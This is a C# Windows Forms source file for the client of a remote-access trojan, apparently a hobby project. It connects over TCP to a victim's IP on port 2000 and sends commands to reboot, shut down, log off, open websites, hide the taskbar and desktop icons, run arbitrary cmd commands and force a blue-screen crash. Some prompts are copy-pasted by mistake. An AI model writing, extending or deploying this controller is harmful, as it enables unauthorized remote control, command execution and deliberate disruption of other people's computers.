using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Trojan_Client__Schöner_
{
    public partial class Form1 : Form
    {
        public static bool IsConnected;
        public static NetworkStream Writer;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            TcpClient Connector = new TcpClient();
            string IP = textBox1.Text;
            try
            {
                Connector.Connect(IP, 2000);
                IsConnected = true;
                Writer = Connector.GetStream();
                label2.Text = "Connection succesful to: " + IP + ".";
                textBox1.Enabled = false;
                button1.Enabled = false;
                button2.Enabled = true;
                button3.Enabled = true;
                button4.Enabled = true;
                button5.Enabled = true;
                button6.Enabled = true;
                button7.Enabled = true;
                button8.Enabled = true;
                button9.Enabled = true;
                button12.Enabled = true;
                button13.Enabled = true;
            }
            catch
            {
                MessageBox.Show("Error while Connecting", "Error");
                textBox1.Text = "";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("What do you like to send?");
            if (input != "") {
                SendCommand("MESSAGE!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
        }
        public static void SendCommand(string Command)
        {
            try
            {
                byte[] Packet = Encoding.ASCII.GetBytes(Command);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch
            {
                IsConnected = false;
                Writer.Close();
            }

        }

        private void button4_Click(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("Time until Restart?");
            if (input != "")
            {
                SendCommand("REBOOT!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("Time until Shutdown?");
           if (input != "")
            {
                SendCommand("SHUTDOWN!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("What Site do you want to Open?");
            if (input != "")
            {
                SendCommand("OPENSITE!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            SendCommand("HIDETASKBAR!!!!---");
        }

        private void button7_Click(object sender, EventArgs e)
        {
            SendCommand("SHOWTASKBAR!!!!---");
        }
		private void Button8Click(object sender, EventArgs e)
		{
			SendCommand("HIDEDESKTOPICONS!!!!---");
		}
		private void Button9Click(object sender, EventArgs e)
		{
			SendCommand("SHOWDESKTOPICONS!!!!---");
		}
		private void Button10Click(object sender, EventArgs e)
		{
			SendCommand("!!!!---");
		}
		private void Button11Click(object sender, EventArgs e)
		{
			SendCommand("!!!!---");
		}
		private void Button13Click(object sender, EventArgs e)
		{
		string input = Microsoft.VisualBasic.Interaction.InputBox("Time until Shutdown?");
           if (input != "")
            {
                SendCommand("CMDCOMMAND!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
		}
		private void Button12Click(object sender, EventArgs e) 
		{
		string input = Microsoft.VisualBasic.Interaction.InputBox("Time until Shutdown?");
           if (input != "")
            {
                SendCommand("LOGOFF!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
		}

        private void button14_Click(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("Warning! This will cause a BSOD on the Remote System. Continue?", "Warning", MessageBoxButtons.YesNo);
            if (result == DialogResult.Yes)
            {
                SendCommand("BSOD!!!!---");
                MessageBox.Show("Order 66 has been Completed and The System should BSOD Soon!");
                Writer.Close();
                Application.Exit();
            }
            else
            {
                MessageBox.Show("Canceld!");
            }
        }
    }

    }
